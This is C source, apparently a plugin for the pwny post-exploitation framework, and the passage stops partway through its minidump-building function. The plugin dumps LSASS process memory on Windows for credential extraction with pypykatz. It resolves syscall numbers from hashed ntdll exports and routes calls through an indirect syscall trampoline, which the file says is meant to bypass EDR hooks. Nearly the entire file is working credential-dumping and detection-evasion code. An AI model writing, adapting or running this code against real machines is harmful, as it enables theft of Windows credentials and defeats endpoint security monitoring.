/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * lsadump — Stealthy LSASS memory dump via direct (indirect) syscalls.
 *
 * This COT plugin reads LSASS process memory using only Nt* syscalls
 * routed through an indirect trampoline that lands inside ntdll, past
 * any userland EDR hooks.  No Win32 APIs (OpenProcess, MiniDumpWriteDump,
 * dbghelp.dll) are called on the hot path.
 *
 * The dump is assembled into a valid minidump format in memory and
 * returned via TLV, ready for pypykatz consumption.
 *
 * Syscalls used:
 *   NtQuerySystemInformation  — find LSASS PID
 *   NtOpenProcess             — get handle
 *   NtQueryInformationProcess — get PEB address for module list
 *   NtQueryVirtualMemory      — enumerate committed regions
 *   NtReadVirtualMemory       — read pages
 *   NtClose                   — release handle
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* MinGW may not expose PEB / UNICODE_STRING in a COT context.
 * Define the minimal subset we need ourselves. */

#ifndef _UNICODE_STRING_DEFINED
#define _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
#endif

typedef struct _LSA_UNICODE_STRING LSA_UNICODE_STRING;

/* PEB / PEB_LDR_DATA (host process — for ntdll base discovery only) */

typedef struct _PEB_LDR_DATA_LOCAL
{
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderLinks;
} PEB_LDR_DATA_LOCAL;

typedef struct _PEB_LOCAL
{
    BYTE              Reserved1[2];
    BYTE              BeingDebugged;
    BYTE              Reserved2[1];
    PVOID             Reserved3[2];
    PEB_LDR_DATA_LOCAL *Ldr;
} PEB_LOCAL;

/* ================================================================== */
/* TLV constants                                                       */
/* ================================================================== */

#define LSADUMP_CREATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define TLV_TYPE_LSA_PID  TLV_TYPE_CUSTOM(TLV_TYPE_INT,   TAB_BASE, API_TYPE)
#define TLV_TYPE_LSA_DATA TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
#define TLV_TYPE_LSA_SIZE TLV_TYPE_CUSTOM(TLV_TYPE_INT,   TAB_BASE, API_TYPE + 1)

/* ================================================================== */
/* NT type definitions                                                 */
/* ================================================================== */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)

#ifndef FILE_BEGIN
#define FILE_BEGIN 0
#endif

/* PROCESS_BASIC_INFORMATION */
typedef struct
{
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

/* SYSTEM_PROCESS_INFORMATION (abbreviated) */
typedef struct _SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION;

/* MEMORY_BASIC_INFORMATION */
typedef struct
{
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    USHORT PartitionId;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
} MBI;

#define MEM_COMMIT 0x1000
#define PAGE_NOACCESS 0x01
#define PAGE_GUARD    0x100

/* PEB structures for remote module enumeration */
typedef struct _PEB_LDR_DATA_REMOTE
{
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA_REMOTE;

typedef struct _LDR_DATA_TABLE_ENTRY_REMOTE
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_REMOTE;

/* Minimal remote PEB layout */
typedef struct
{
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr; /* PEB_LDR_DATA* */
} PEB_REMOTE;

/* ================================================================== */
/* Minidump format structures                                          */
/* ================================================================== */

#pragma pack(push, 4)

#define MDMP_SIGNATURE 0x504D444D /* "MDMP" */
#define MDMP_VERSION   0xA793

typedef struct
{
    DWORD Signature;
    DWORD Version;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD TimeDateStamp;
    ULONGLONG Flags;
} MDMP_HEADER;

typedef struct
{
    DWORD StreamType;
    DWORD DataSize;
    DWORD Rva;
} MDMP_DIRECTORY;

/* SystemInfoStream (type 7) */
typedef struct
{
    USHORT ProcessorArchitecture;
    USHORT ProcessorLevel;
    USHORT ProcessorRevision;
    UCHAR  NumberOfProcessors;
    UCHAR  ProductType;
    DWORD  MajorVersion;
    DWORD  MinorVersion;
    DWORD  BuildNumber;
    DWORD  PlatformId;
    DWORD  CSDVersionRva;
    USHORT SuiteMask;
    USHORT Reserved2;
    /* x64 CPU info */
    DWORD  VendorId0;
    DWORD  VendorId1;
    DWORD  VendorId2;
    DWORD  VersionInformation;
    DWORD  FeatureInformation;
    DWORD  AMDExtendedCPUFeatures;
} MDMP_SYSTEM_INFO;

/* ModuleListStream (type 4) */
typedef struct
{
    ULONGLONG BaseOfImage;
    DWORD     SizeOfImage;
    DWORD     CheckSum;
    DWORD     TimeDateStamp;
    DWORD     ModuleNameRva;
    /* VS_FIXEDFILEINFO */
    DWORD     dwSignature;
    DWORD     dwStrucVersion;
    DWORD     dwFileVersionMS;
    DWORD     dwFileVersionLS;
    DWORD     dwProductVersionMS;
    DWORD     dwProductVersionLS;
    DWORD     dwFileFlagsMask;
    DWORD     dwFileFlags;
    DWORD     dwFileOS;
    DWORD     dwFileType;
    DWORD     dwFileSubtype;
    DWORD     dwFileDateMS;
    DWORD     dwFileDateLS;
    /* CvRecord / MiscRecord */
    DWORD     CvRecordSize;
    DWORD     CvRecordRva;
    DWORD     MiscRecordSize;
    DWORD     MiscRecordRva;
    ULONGLONG Reserved0;
    ULONGLONG Reserved1;
} MDMP_MODULE;

/* Memory64ListStream (type 9) */
typedef struct
{
    ULONGLONG StartOfMemoryRange;
    ULONGLONG DataSize;
} MDMP_MEMORY_DESCRIPTOR64;

typedef struct
{
    ULONGLONG NumberOfMemoryRanges;
    ULONGLONG BaseRva; /* RVA of first memory block in file */
} MDMP_MEMORY64_LIST_HEADER;

/* MINIDUMP_STRING — length-prefixed Unicode string */
typedef struct
{
    DWORD Length; /* byte count, NOT including NUL */
    /* followed by wchar_t[] */
} MDMP_STRING;

#pragma pack(pop)

/* Stream types */
#define SystemInfoStream     7
#define ModuleListStream     4
#define Memory64ListStream   9

/* Flags */
#define MiniDumpWithFullMemory 0x00000002

/* ProcessorArchitecture */
#define PROCESSOR_ARCHITECTURE_AMD64 9

/* ================================================================== */
/* Syscall infrastructure (self-contained for COT)                     */
/* ================================================================== */

typedef struct
{
    DWORD  hash;
    DWORD  nargs;
    DWORD  number;
    PVOID  trampoline;
} sc_entry_t;

/* DJB2 hash */
static __inline DWORD sc_djb2(const char *s)
{
    DWORD h = 5381;
    while (*s)
    {
        h = ((h << 5) + h) + (BYTE)*s;
        s++;
    }
    return h;
}

/* Pre-computed hashes for Zw* names */
#define SC_OPENPROCESS_HASH              0x9B524A87U
#define SC_CLOSE_HASH                    0x2E48662CU
#define SC_QUERYSYSTEMINFORMATION_HASH   0xF9E1E277U
#define SC_QUERYINFORMATIONPROCESS_HASH  0x4E154511U
#define SC_QUERYVIRTUALMEMORY_HASH       0x8802EDACU
#define SC_READVIRTUALMEMORY_HASH        0xD6BF9452U

#define SC_MAX_ENTRIES 600

typedef struct
{
    DWORD hash;
    PVOID addr;
} sc_sort_entry_t;

typedef struct
{
    DWORD            count;
    sc_sort_entry_t  entries[SC_MAX_ENTRIES];
} sc_sort_list_t;

/* Assembly trampoline (gate.S) */
extern NTSTATUS _lsa_sc_gate(void);

#ifdef __MINGW32__
#pragma GCC push_options
#pragma GCC optimize ("O0")
#endif

static NTSTATUS _lsa_sc_stub(sc_entry_t *entry, ...)
{
    return _lsa_sc_gate();
}

/* Per-syscall wrappers */

static NTSTATUS sc_NtOpenProcess(sc_entry_t *e, PHANDLE ph,
                                 ACCESS_MASK access,
                                 PVOID oa, PVOID cid)
{
    return _lsa_sc_stub(e, ph, access, oa, cid);
}

static NTSTATUS sc_NtClose(sc_entry_t *e, HANDLE h)
{
    return _lsa_sc_stub(e, h);
}

static NTSTATUS sc_NtQuerySystemInformation(sc_entry_t *e,
                                            ULONG cls,
                                            PVOID buf,
                                            ULONG len,
                                            PULONG ret)
{
    return _lsa_sc_stub(e, cls, buf, len, ret);
}

static NTSTATUS sc_NtQueryInformationProcess(sc_entry_t *e,
                                             HANDLE proc,
                                             ULONG cls,
                                             PVOID buf,
                                             ULONG len,
                                             PULONG ret)
{
    return _lsa_sc_stub(e, proc, cls, buf, len, ret);
}

static NTSTATUS sc_NtQueryVirtualMemory(sc_entry_t *e,
                                        HANDLE proc,
                                        PVOID addr,
                                        ULONG cls,
                                        PVOID buf,
                                        SIZE_T len,
                                        PSIZE_T ret)
{
    return _lsa_sc_stub(e, proc, addr, cls, buf, len, ret);
}

static NTSTATUS sc_NtReadVirtualMemory(sc_entry_t *e,
                                       HANDLE proc,
                                       PVOID addr,
                                       PVOID buf,
                                       SIZE_T len,
                                       PSIZE_T ret)
{
    return _lsa_sc_stub(e, proc, addr, buf, len, ret);
}

#ifdef __MINGW32__
#pragma GCC pop_options
#endif

/* ---- Trampoline address extraction ---- */

static int sc_extract_trampoline(PVOID stub, sc_entry_t *entry)
{
    PBYTE b;
    PBYTE target;

    if (stub == NULL || entry == NULL)
        return 0;

    b = (PBYTE)stub;

    /*
     * Normal x64 ntdll stub:
     *   4C 8B D1          mov r10, rcx
     *   B8 XX XX 00 00    mov eax, <syscall_nr>
     *   <-- offset +8 --> test / syscall ...
     *
     * Hooked stub starts with E9 (jmp) — the trampoline target
     * is still at +8, past the overwritten preamble.
     */
    if ((*(PUINT32)b == 0xb8d18b4c &&
         *(PUSHORT)(b + 4) == (USHORT)entry->number) ||
        b[0] == 0xe9)
    {
        target = b + 8;
    }
    else
    {
        return 0;
    }

    /*
     * Validate the trampoline target — must look like real
     * Windows ntdll (not Wine, not weird hooks, etc.).
     *
     * Pre-Meltdown:   0F 05         syscall
     * Meltdown-era:   F6 04 25 ...  test byte ptr [SharedUserData+0x308], 1
     */
    if (target[0] == 0x0F && target[1] == 0x05)
    {
        /* Direct syscall; ret — classic pattern */
        entry->trampoline = (PVOID)target;
        return 1;
    }

    if (target[0] == 0xF6 && target[1] == 0x04 && target[2] == 0x25)
    {
        /* KiSystemCall64 test — branches to syscall or int 2Eh */
        entry->trampoline = (PVOID)target;
        return 1;
    }

    return 0;
}

/* ---- Resolve syscall numbers by sorting Zw* exports ---- */

static int sc_resolve_all(PVOID ntdll_base, sc_entry_t *entries[], DWORD count)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD names, funcs;
    PWORD  ords;
    DWORD  i, j;
    int    is_wine = 0;

    /*
     * sc_sort_list_t is ~9.6 KB — too large for stack in a COT plugin.
     * Heap-allocate to avoid __chkstk issues.
     */
    sc_sort_list_t *list = (sc_sort_list_t *)malloc(sizeof(sc_sort_list_t));
    if (list == NULL)
        return 0;

    dos   = (PIMAGE_DOS_HEADER)ntdll_base;
    nt    = (PIMAGE_NT_HEADERS)((PBYTE)ntdll_base + dos->e_lfanew);
    exp   = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdll_base +
                nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    names = (PDWORD)((PBYTE)ntdll_base + exp->AddressOfNames);
    funcs = (PDWORD)((PBYTE)ntdll_base + exp->AddressOfFunctions);
    ords  = (PWORD)((PBYTE)ntdll_base + exp->AddressOfNameOrdinals);

    /* Collect all Zw* exports */
    list->count = 0;

    for (i = 0; i < exp->NumberOfNames; i++)
    {
        char *name = (char *)((PBYTE)ntdll_base + names[i]);

        /* Detect Wine — ntdll exports wine_get_version / wine_get_build_id.
         * Wine's ntdll uses a completely different syscall dispatch path
         * (Unix calls through the Wine server) so the indirect syscall
         * trampoline can't work there.  Bail early. */
        if (name[0] == 'w' && name[1] == 'i' && name[2] == 'n' &&
            name[3] == 'e' && name[4] == '_')
        {
            is_wine = 1;
        }

        if (name[0] == 'Z' && name[1] == 'w')
        {
            list->entries[list->count].hash = sc_djb2(name);
            list->entries[list->count].addr =
                (PVOID)((PBYTE)ntdll_base + funcs[ords[i]]);

            if (++list->count == SC_MAX_ENTRIES)
                break;
        }
    }

    /* Wine detected — indirect syscalls won't work */
    if (is_wine)
    {
        free(list);
        return 0;
    }

    /* Sort by address — index = syscall number */
    for (i = 0; i < list->count - 1; i++)
    {
        for (j = 0; j < list->count - i - 1; j++)
        {
            if (list->entries[j].addr > list->entries[j + 1].addr)
            {
                sc_sort_entry_t tmp = list->entries[j];
                list->entries[j]     = list->entries[j + 1];
                list->entries[j + 1] = tmp;
            }
        }
    }

    /* Match requested entries */
    for (i = 0; i < count; i++)
    {
        for (j = 0; j < list->count; j++)
        {
            if (list->entries[j].hash == entries[i]->hash)
            {
                entries[i]->number = j;

                if (!sc_extract_trampoline(list->entries[j].addr, entries[i]))
                {
                    free(list);
                    return 0;
                }

                break;
            }
        }
    }

    free(list);

    /* Verify all resolved */
    for (i = 0; i < count; i++)
    {
        if (entries[i]->trampoline == NULL)
            return 0;
    }

    return 1;
}

/* ================================================================== */
/* PEB walk to find ntdll base                                         */
/* ================================================================== */

static PVOID find_ntdll_base(void)
{
    PVOID ntdll = NULL;

#ifdef _WIN64
    /* TEB->PEB is at gs:[0x60] */
    PEB_LOCAL *peb = (PEB_LOCAL *)__readgsqword(0x60);
#else
    PEB_LOCAL *peb = (PEB_LOCAL *)__readfsdword(0x30);
#endif

    /*
     * PEB->Ldr->InMemoryOrderModuleList:
     *   Entry 0 = process image
     *   Entry 1 = ntdll.dll
     */
    PEB_LDR_DATA_LOCAL *ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    /* Skip first (process image) */
    entry = entry->Flink;

    if (entry != head)
    {
        /* LDR_DATA_TABLE_ENTRY::InMemoryOrderLinks is at offset 0x10
         * from the start of the struct.  DllBase is at offset 0x30
         * from struct start = offset 0x20 from InMemoryOrderLinks. */
        ntdll = *(PVOID *)((PBYTE)entry + 0x20);
    }

    return ntdll;
}

/* ================================================================== */
/* Syscall entry descriptors (static, in .data)                        */
/* ================================================================== */

static sc_entry_t sce_OpenProcess               = { SC_OPENPROCESS_HASH,             4, 0, NULL };
static sc_entry_t sce_Close                      = { SC_CLOSE_HASH,                   1, 0, NULL };
static sc_entry_t sce_QuerySystemInformation     = { SC_QUERYSYSTEMINFORMATION_HASH,  4, 0, NULL };
static sc_entry_t sce_QueryInformationProcess    = { SC_QUERYINFORMATIONPROCESS_HASH, 5, 0, NULL };
static sc_entry_t sce_QueryVirtualMemory         = { SC_QUERYVIRTUALMEMORY_HASH,      6, 0, NULL };
static sc_entry_t sce_ReadVirtualMemory          = { SC_READVIRTUALMEMORY_HASH,       5, 0, NULL };

static int g_sc_ready = 0;

/* ================================================================== */
/* OBJECT_ATTRIBUTES + CLIENT_ID for NtOpenProcess                     */
/* ================================================================== */

typedef struct
{
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJ_ATTR;

typedef struct
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

/* ================================================================== */
/* Helper — find LSASS PID via NtQuerySystemInformation                */
/* ================================================================== */

static DWORD find_lsass_pid(void)
{
    NTSTATUS status;
    PVOID buf = NULL;
    ULONG size = 0x10000;
    ULONG needed = 0;
    SYSTEM_PROCESS_INFORMATION *spi;
    DWORD pid = 0;

    /* SystemProcessInformation = 5 */
    for (;;)
    {
        buf = malloc(size);
        if (buf == NULL) return 0;

        status = sc_NtQuerySystemInformation(&sce_QuerySystemInformation,
                                             5, buf, size, &needed);
        if (NT_SUCCESS(status))
            break;

        free(buf);

        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            size = needed + 0x1000;
            continue;
        }

        return 0;
    }

    spi = (SYSTEM_PROCESS_INFORMATION *)buf;

    for (;;)
    {
        if (spi->ImageName.Buffer != NULL && spi->ImageName.Length > 0)
        {
            /* Compare against L"lsass.exe" (case-insensitive) */
            wchar_t *name = spi->ImageName.Buffer;
            int len = spi->ImageName.Length / sizeof(wchar_t);

            if (len == 9)
            {
                /* Manual case-insensitive wchar comparison */
                wchar_t lower[10];
                int k;

                for (k = 0; k < len; k++)
                {
                    wchar_t c = name[k];
                    if (c >= L'A' && c <= L'Z')
                        c += 32;
                    lower[k] = c;
                }
                lower[len] = 0;

                if (lower[0] == L'l' && lower[1] == L's' &&
                    lower[2] == L'a' && lower[3] == L's' &&
                    lower[4] == L's' && lower[5] == L'.' &&
                    lower[6] == L'e' && lower[7] == L'x' &&
                    lower[8] == L'e')
                {
                    pid = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
                    break;
                }
            }
        }

        if (spi->NextEntryOffset == 0) break;
        spi = (SYSTEM_PROCESS_INFORMATION *)((PBYTE)spi + spi->NextEntryOffset);
    }

    free(buf);
    return pid;
}

/* ================================================================== */
/* Dynamic buffer for building the minidump in memory                  */
/* ================================================================== */

typedef struct
{
    unsigned char *data;
    size_t         size;
    size_t         capacity;
} dyn_buf_t;

static void db_init(dyn_buf_t *db)
{
    db->data = NULL;
    db->size = 0;
    db->capacity = 0;
}

static int db_reserve(dyn_buf_t *db, size_t needed)
{
    if (db->size + needed <= db->capacity)
        return 1;

    size_t new_cap = db->capacity ? db->capacity : 0x100000; /* 1 MB initial */
    while (new_cap < db->size + needed)
        new_cap *= 2;

    unsigned char *new_data = (unsigned char *)malloc(new_cap);
    if (new_data == NULL)
        return 0;

    if (db->data)
    {
        memcpy(new_data, db->data, db->size);
        free(db->data);
    }

    db->data = new_data;
    db->capacity = new_cap;
    return 1;
}

static int db_append(dyn_buf_t *db, const void *data, size_t len)
{
    if (!db_reserve(db, len))
        return 0;

    memcpy(db->data + db->size, data, len);
    db->size += len;
    return 1;
}

static int db_append_zeros(dyn_buf_t *db, size_t len)
{
    if (!db_reserve(db, len))
        return 0;

    memset(db->data + db->size, 0, len);
    db->size += len;
    return 1;
}

static void db_write_at(dyn_buf_t *db, size_t offset, const void *data, size_t len)
{
    if (offset + len <= db->capacity)
        memcpy(db->data + offset, data, len);
}

static void db_free(dyn_buf_t *db)
{
    if (db->data)
        free(db->data);

    db->data = NULL;
    db->size = 0;
    db->capacity = 0;
}

/* ================================================================== */
/* Module info collected from LSASS PEB                                */
/* ================================================================== */

#define MAX_MODULES 256

typedef struct
{
    ULONGLONG base;
    DWORD     size;
    wchar_t   name[260]; /* full path */
    int       name_wchars;
} module_info_t;

typedef struct
{
    module_info_t entries[MAX_MODULES];
    int count;
} module_list_t;

/* ================================================================== */
/* Read LSASS PEB → module list via NtReadVirtualMemory                */
/* ================================================================== */

static int read_remote(HANDLE proc, PVOID addr, PVOID buf, SIZE_T len)
{
    SIZE_T rd = 0;
    NTSTATUS st = sc_NtReadVirtualMemory(&sce_ReadVirtualMemory,
                                         proc, addr, buf, len, &rd);
    return NT_SUCCESS(st) && rd == len;
}

static void enumerate_modules(HANDLE proc, PVOID peb_addr, module_list_t *mods)
{
    PEB_REMOTE peb;
    PEB_LDR_DATA_REMOTE ldr;
    LIST_ENTRY head;
    PVOID current;
    LDR_DATA_TABLE_ENTRY_REMOTE ldr_entry;

    mods->count = 0;

    if (!read_remote(proc, peb_addr, &peb, sizeof(peb)))
        return;

    if (peb.Ldr == NULL)
        return;

    if (!read_remote(proc, peb.Ldr, &ldr, sizeof(ldr)))
        return;

    /* InMemoryOrderModuleList head is at Ldr + offsetof(InMemoryOrderModuleList) */
    PVOID head_addr = (PBYTE)peb.Ldr +
        __builtin_offsetof(PEB_LDR_DATA_REMOTE, InMemoryOrderModuleList);

    head = ldr.InMemoryOrderModuleList;
    current = (PVOID)head.Flink;

    while (current != head_addr && mods->count < MAX_MODULES)
    {
        /* InMemoryOrderLinks is at offset 0x10 in LDR_DATA_TABLE_ENTRY,
         * so the entry base is current - 0x10 */
        PVOID entry_base = (PBYTE)current - 0x10;

        if (!read_remote(proc, entry_base, &ldr_entry, sizeof(ldr_entry)))
            break;

        if (ldr_entry.DllBase == NULL)
            break;

        module_info_t *mod = &mods->entries[mods->count];
        mod->base = (ULONGLONG)(ULONG_PTR)ldr_entry.DllBase;
        mod->size = ldr_entry.SizeOfImage;
        mod->name_wchars = 0;
        memset(mod->name, 0, sizeof(mod->name));

        /* Read the full DLL name */
        if (ldr_entry.FullDllName.Buffer != NULL &&
            ldr_entry.FullDllName.Length > 0)
        {
            int wchars = ldr_entry.FullDllName.Length / sizeof(wchar_t);
            if (wchars > 259) wchars = 259;

            if (read_remote(proc, ldr_entry.FullDllName.Buffer,
                            mod->name, wchars * sizeof(wchar_t)))
            {
                mod->name[wchars] = 0;
                mod->name_wchars = wchars;
            }
        }

        mods->count++;
        current = (PVOID)ldr_entry.InMemoryOrderLinks.Flink;
    }
}

/* ================================================================== */
/* Memory region descriptor                                            */
/* ================================================================== */

#define MAX_REGIONS 4096

typedef struct
{
    ULONGLONG base;
    ULONGLONG size;
} mem_region_t;

/* ================================================================== */
/* Build a valid minidump for pypykatz from memory                     */
/* ================================================================== */

static int build_minidump(HANDLE proc,
                          module_list_t *mods,
                          dyn_buf_t *dump)
{
    MBI mbi;
    SIZE_T retlen;
    NTSTATUS status;
    PVOID addr;
    DWORD i;

    /* ---- Phase 1: Enumerate committed regions ---- */

    mem_region_t *regions = (mem_region_t *)malloc(MAX_REGIONS * sizeof(mem_region_t));
    if (regions == NULL)
        return 0;

    int region_count = 0;
    addr = NULL;

    while (region_count < MAX_REGIONS)
    {
        status = sc_NtQueryVirtualMemory(&sce_QueryVirtualMemory,
                                         proc, addr, 0 /* MemoryBasicInformation */,
                                         &mbi, sizeof(mbi), &retlen);

        if (!NT_SUCCESS(status))
            break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_NOACCESS) == 0 &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            mbi.RegionSize > 0)
        {
            regions[region_count].base = (ULONGLONG)(ULONG_PTR)mbi.BaseAddress;
            regions[region_count].size = (ULONGLONG)mbi.RegionSize;
            region_count++;
        }

        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
        if ((ULONG_PTR)addr <= (ULONG_PTR)mbi.BaseAddress)
            break; /* wraparound */
    }

    if (region_count == 0)
    {
        free(regions);
        return 0;
    }

    /* ---- Phase 2: Build minidump header + directory ---- */

    /*
     * File layout:
     *   [MDMP_HEADER]                32 bytes   @ 0
     *   [MDMP_DIRECTORY] x 3         12 * 3     @ 32
     *   [SystemInfoStream data]      56 bytes
     *   [ModuleListStream data]      variable
     *   [Memory64ListStream header]  16 + 16*N
     *   [Memory data blocks]         variable
     *
     * Module name strings are placed after the ModuleListStream entries.
     */

    /* Pre-calculate sizes */

    /* SystemInfo is 56 bytes */
    DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);

    /* ModuleList: 4 (count) + N * sizeof(MDMP_MODULE) */
    DWORD module_list_size = 4 + mods->count * sizeof(MDMP_MODULE);

    /* Module name strings: each is 4 (MDMP_STRING.Length) + wchar data + 2 (NUL) */
    DWORD names_size = 0;
    for (i = 0; i < (DWORD)mods->count; i++)
    {
        names_size += 4 + mods->entries[i].name_wchars * 2 + 2;
    }

    /* RVA calculations */
    DWORD dir_rva = sizeof(MDMP_HEADER);
    DWORD sysinfo_rva = dir_rva + 3 * sizeof(MDMP_DIRECTORY);
    DWORD modlist_rva = sysinfo_rva + sysinfo_size;
    DWORD names_rva = modlist_rva + module_list_size;
    DWORD mem64_rva = names_rva + names_size;

    /* Memory64List header: 16 bytes + region_count * 16 */
    DWORD mem64_hdr_size = (DWORD)(sizeof(MDMP_MEMORY64_LIST_HEADER) +
                           region_count * sizeof(MDMP_MEMORY_DESCRIPTOR64));
    DWORD mem64_data_rva = mem64_rva + mem64_hdr_size;

    /* ---- Write header ---- */

    MDMP_HEADER hdr;
    memset(&hdr, 0, sizeof(hdr));
    hdr.Signature = MDMP_SIGNATURE;
    hdr.Version = MDMP_VERSION | (0x0006 << 16); /* internal version */
    hdr.NumberOfStreams = 3;
    hdr.StreamDirectoryRva = dir_rva;
    hdr.Flags = MiniDumpWithFullMemory;

    db_append(dump, &hdr, sizeof(hdr));

    /* ---- Write directory entries ---- */

    MDMP_DIRECTORY dirs[3];

    dirs[0].StreamType = SystemInfoStream;
    dirs[0].DataSize = sysinfo_size;
    dirs[0].Rva = sysinfo_rva;

    dirs[1].StreamType = ModuleListStream;
    dirs[1].DataSize = module_list_size + names_size;
    dirs[1].Rva = modlist_rva;

    dirs[2].StreamType = Memory64ListStream;
    dirs[2].DataSize = mem64_hdr_size;
    dirs[2].Rva = mem64_rva;

    db_append(dump, dirs, sizeof(dirs));

    /* ---- SystemInfoStream ---- */

    MDMP_SYSTEM_INFO si;
    memset(&si, 0, sizeof(si));
    si.ProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64;
    si.ProcessorLevel = 6; /* generic */
    si.NumberOfProcessors = 1;
    si.ProductType = 1; /* VER_NT_WORKSTATION */
    si.MajorVersion = 10;
    si.MinorVersion = 0;
    si.BuildNumber = 19041; /* generic Win10 */
    si.PlatformId = 2; /* VER_PLATFORM_WIN32_NT */

    db_append(dump, &si, sizeof(si));

    /* ---- ModuleListStream ---- */

    DWORD mod_count_le = (DWORD)mods->count;
    db_append(dump, &mod_count_le, 4);

    /* Track where name strings will be placed */
    DWORD cur_name_rva = names_rva;

    for (i = 0; i < (DWORD)mods->count; i++)
    {
        MDMP_MODULE mod;
        memset(&mod, 0, sizeof(mod));
        mod.BaseOfImage = mods->entries[i].base;
        mod.SizeOfImage = mods->entries[i].size;
        mod.ModuleNameRva = cur_name_rva;

        db_append(dump, &mod, sizeof(mod));

        cur_name_rva += 4 + mods->entries[i].name_wchars * 2 + 2;
    }

    /* Module name strings */
    for (i = 0; i < (DWORD)mods->count; i++)
    {
        DWORD byte_len = mods->entries[i].name_wchars * 2;
        db_append(dump, &byte_len, 4);
        db_append(dump, mods->entries[i].name, byte_len);

        /* NUL terminator (2 bytes) */
        USHORT nul = 0;
        db_append(dump, &nul, 2);
    }

    /* ---- Memory64ListStream header ---- */

    MDMP_MEMORY64_LIST_HEADER m64hdr;
    m64hdr.NumberOfMemoryRanges = region_count;
    m64hdr.BaseRva = mem64_data_rva;
